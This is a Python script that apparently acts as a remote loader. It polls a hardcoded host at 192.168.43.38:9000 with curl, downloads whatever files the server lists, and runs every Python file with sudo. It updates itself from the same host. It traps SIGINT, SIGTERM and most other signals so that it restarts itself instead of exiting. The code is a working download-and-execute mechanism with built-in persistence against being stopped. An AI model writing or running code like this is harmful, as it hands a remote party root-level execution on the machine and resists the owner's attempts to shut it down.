import subprocess
import time
import os
import sys
import signal

loaded_files = []
data = ""

def run_command(command):

    command = command.rstrip()
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output

def check_status():
    global data
    COMMAND = "curl http://192.168.43.38:9000/status.txt -o status.txt"
    run_command(COMMAND)
    try:
        file_object = open("status.txt", "r")
        data = file_object.read()
        file_object.close()
        COMMAND = "rm status.txt"
        run_command(COMMAND)
        data = data.split("\n")
        if(data[0] == "1"):
            fetch_directory_list()  
            download_fetched_files()
    except:
        pass


def refresh_downloader():
    COMMAND = "curl http://192.168.43.38:9000/downloader.py -o downloader.py"
    run_command(COMMAND)
    COMMAND = "python3 downloader.py"
    command_split = COMMAND.split(" ")
    subprocess.Popen(command_split)
    os._exit(os.EX_OK)

def fetch_directory_list():
    global loaded_files
    COMMAND = "curl http://192.168.43.38:9000"
    output = run_command(COMMAND)
    try:
        output = output.decode('utf-8')
    except:
        pass
    output_split = output.split("\n")
    try: 
        for line in output_split:
            if(line not in loaded_files and line != "status.txt"):
                
                if(line == "downloader.py"):
                    if(data[1] == "1"):
                        time.sleep(5)
                        refresh_downloader()
                else:
                    loaded_files.append(line)
    except:
        pass

def run_scripts():
    current_dir = os.getcwd()
    for filename in os.listdir(current_dir):
        if(filename != "setup_server.py" and filename != "downloader.py"):
            try:
                dot_index = filename.index(".")
                extension = filename[dot_index + 1:]
                if(extension == "py"):
                    command_list = []
                    command_list.append("sudo")
                    command_list.append("python3")
                    command_list.append(filename)
                    subprocess.Popen(command_list)
    
            except Exception:
                pass

def download_fetched_files():
    global loaded_files

    for file in loaded_files:
        path = "http://192.168.43.38:9000/" + file
        command = "curl -o " + file + " " + path + " --silent"
        run_command(command)
    loaded_files = []
    run_scripts()

def refresh_downloader_on_signal(signalNumber, frame):
    COMMAND = "curl http://192.168.43.38:9000/downloader.py -o downloader.py"
    run_command(COMMAND)
    COMMAND = "python3 downloader.py"
    command_split = COMMAND.split(" ")
    subprocess.Popen(command_split)
    os._exit(os.EX_OK)

def signal_handlers():
    try:
        signal.signal(signal.SIGHUP, refresh_downloader_on_signal)
        signal.signal(signal.SIGINT, refresh_downloader_on_signal)
        signal.signal(signal.SIGQUIT, refresh_downloader_on_signal)
        signal.signal(signal.SIGILL, refresh_downloader_on_signal)
        signal.signal(signal.SIGTRAP, refresh_downloader_on_signal)
        signal.signal(signal.SIGABRT, refresh_downloader_on_signal)
        signal.signal(signal.SIGBUS, refresh_downloader_on_signal)
        signal.signal(signal.SIGFPE, refresh_downloader_on_signal)
        signal.signal(signal.SIGUSR1, refresh_downloader_on_signal)
        signal.signal(signal.SIGSEGV, refresh_downloader_on_signal)
        signal.signal(signal.SIGUSR2, refresh_downloader_on_signal)
        signal.signal(signal.SIGPIPE, refresh_downloader_on_signal)
        signal.signal(signal.SIGALRM, refresh_downloader_on_signal)
        signal.signal(signal.SIGTERM, refresh_downloader_on_signal)
    
    except Exception as e:
        pass

signal_handlers()

while True:
    print("This is updated version")
    check_status()
    time.sleep(20)